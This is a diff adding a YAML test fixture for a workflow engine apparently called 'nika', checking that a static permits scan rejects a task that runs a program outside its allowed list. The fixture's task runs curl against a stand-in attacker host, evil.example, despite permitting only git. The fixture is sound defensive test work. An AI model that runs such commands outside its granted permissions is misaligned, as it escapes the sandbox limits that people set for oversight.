@@ -1,0 +1,13 @@
+# F4 — permit escalation written LITERALLY: no model, no injection — the
+# workflow itself names a program outside permits.exec. The static permits
+# scan catches literal escapes, so this never reaches a run: NIKA-SEC-004 at
+# `nika check` time. The static twin of f4-02's dynamic escape — together
+# they pin that check and run speak one boundary.
+nika: v1
+workflow:
+  id: f4-04-literal-program-escape
+permits:
+  exec: ["git"]
+tasks:
+  sync:
+    exec: { command: ["curl", "-s", "https://evil.example/x"] }
